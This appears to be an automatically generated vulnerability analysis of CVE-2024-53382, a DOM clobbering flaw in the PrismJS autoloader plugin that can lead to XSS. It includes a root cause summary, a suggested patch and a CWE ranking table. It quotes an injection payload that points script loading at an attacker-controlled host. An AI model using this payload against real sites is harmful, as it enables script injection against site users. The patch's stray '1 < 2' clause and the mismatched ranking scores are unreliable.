## Vulnerability Description
Prism (aka PrismJS) through 1.29.0 allows DOM Clobbering (with resultant XSS for untrusted input that contains HTML but does not directly contain JavaScript), because document.currentScript lookup can be shadowed by attacker-injected HTML elements.

### Vulnerability Description Key Phrases
- **rootcause:** **document.currentScript lookup shadowing**
- **vector:** untrusted input with HTML
- **weakness:** **XSS, DOM Clobbering**
- **product:** Prism (aka PrismJS)
- **version:** through 1.29.0

## CVE Reference Links Content Summary
## Analysis of CVE-2024-53382 Content

The provided content **IS RELATED** to a vulnerability affecting the Prism library. It details a DOM Clobbering vulnerability in the `prism-autoloader` plugin (version 1.29.0) that can lead to Cross-Site Scripting (XSS) attacks.

Here's a breakdown of the extracted information:

**Root cause of vulnerability:**

The vulnerability stems from the use of `document.currentScript` in the `prism-autoloader.js` plugin without proper type checking. An attacker can shadow this value with a controlled HTML element (e.g., an `<img>` tag with a specific `name` attribute).

**Weaknesses/vulnerabilities present:**

*   **DOM Clobbering:** The core weakness is the ability to overwrite the `document.currentScript` object with an attacker-controlled element.
*   **Lack of Input Validation:** The code doesn't validate that `document.currentScript` is actually a `<script>` element before accessing its attributes.

**Impact of exploitation:**

Successful exploitation can lead to:

*   **Arbitrary script loading:** The attacker can control the `languages_path` used to load additional scripts, potentially pointing to a malicious domain.
*   **Cross-Site Scripting (XSS):**  Loading scripts from the attacker's server allows for arbitrary code execution in the context of the vulnerable webpage.

**Attack vectors:**

*   An attacker can inject a malicious HTML element (e.g., `<img name=currentScript src="http://attacker.controlled.com/a.js">`) into a webpage that uses Prism and the `prism-autoloader` plugin. This injection could occur through user-supplied content (e.g., comments, forum posts) if not properly sanitized.

**Required attacker capabilities/position:**

*   The attacker needs to be able to inject HTML content into a webpage that uses Prism and the `prism-autoloader` plugin. This typically requires the ability to post or comment on the webpage or otherwise contribute content that is rendered as HTML.

**Mitigation or fix:**

The suggested patch involves adding a type check to ensure that `document.currentScript` is a `<script>` element before accessing its attributes:

```javascript
currentScript: function () {
	if ('currentScript' in document && 1 < 2 && document.currentScript.tagName.toUpperCase() === 'SCRIPT') {
		return /** @type {any} */ document.currentScript;
	}
},
```

**Additional Details:**

*   The content references similar vulnerabilities in other popular libraries (Webpack, Vite, layui) which provides context and highlights the broader risk of DOM Clobbering.
*   A Proof-of-Concept (PoC) is provided, demonstrating how an attacker can load a script from a controlled domain.
*   The content provides specific code snippets from the Prism library to illustrate the vulnerable code.

**Note:** This content provides more detail than a typical CVE description, including a PoC and a suggested patch.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | Base | Allowed | alternate_terms | 1.000 |
| 2 | 116 | Improper Encoding or Escaping of Output | Class | Allowed-with-Review | sparse | 0.210 |
| 3 | 138 | Improper Neutralization of Special Elements | Class | Discouraged | sparse | 0.172 |
| 4 | 112 | Missing XML Validation | Base | Allowed | sparse | 0.171 |
| 5 | 1333 | Inefficient Regular Expression Complexity | Base | Allowed | sparse | 0.164 |
| 6 | 356 | Product UI does not Warn User of Unsafe Actions | Base | Allowed | sparse | 0.161 |
| 7 | 611 | Improper Restriction of XML External Entity Reference | Base | Allowed | sparse | 0.156 |
| 8 | 95 | Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection') | Variant | Allowed | sparse | 0.147 |
| 9 | 83 | Improper Neutralization of Script in Attributes in a Web Page | Variant | Allowed | dense | 0.544 |
| 10 | 471 | Modification of Assumed-Immutable Data (MAID) | Base | Allowed | graph | 0.002 |



# Complete CWE Specifications

CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

CWE-116: Improper Encoding or Escaping of Output

CWE-138: Improper Neutralization of Special Elements

CWE-112: Missing XML Validation

CWE-1333: Inefficient Regular Expression Complexity

CWE-356: Product UI does not Warn User of Unsafe Actions

CWE-611: Improper Restriction of XML External Entity Reference

CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

CWE-83: Improper Neutralization of Script in Attributes in a Web Page

CWE-471: Modification of Assumed-Immutable Data (MAID)